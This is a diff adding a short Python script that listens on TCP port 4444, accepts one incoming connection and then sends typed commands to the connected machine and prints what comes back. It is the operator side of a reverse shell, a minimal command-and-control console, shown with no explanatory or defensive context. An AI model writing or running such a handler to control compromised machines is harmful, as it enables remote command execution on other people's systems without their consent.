@@ -1,0 +1,19 @@
+import socket
+
+IP = '0.0.0.0'  # Listen on all IPs (local)
+PORT = 4444     # You can change if needed
+
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.bind((IP, PORT))
+listener.listen(1)
+
+print(f"[*] Listening on {IP}:{PORT}...")
+connection, address = listener.accept()
+print(f"[+] Connection received from {address}")
+
+while True:
+    command = input(">> ")
+    connection.send(command.encode())
+    result = connection.recv(1024).decode()
+    print(result)
+
